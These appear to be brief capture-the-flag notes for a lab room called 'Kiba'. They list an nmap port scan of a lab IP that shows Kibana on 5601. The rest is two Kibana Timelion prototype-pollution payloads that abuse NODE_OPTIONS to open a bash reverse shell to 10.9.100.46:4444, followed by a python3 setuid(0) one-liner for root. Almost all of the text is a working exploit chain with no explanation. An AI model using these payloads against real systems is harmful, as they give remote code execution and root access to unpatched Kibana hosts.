# Kiba Room

export ip=10.10.232.108

22/tcp   open  ssh         syn-ack ttl 63
80/tcp   open  http        syn-ack ttl 63
5044/tcp open  lxi-evntsvc syn-ack ttl 63
5601/tcp open  esmagent    syn-ack ttl 63

10.9.100.46

.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/10.9.100.46/4444 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')

.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.9.100.46/4444 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')

./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'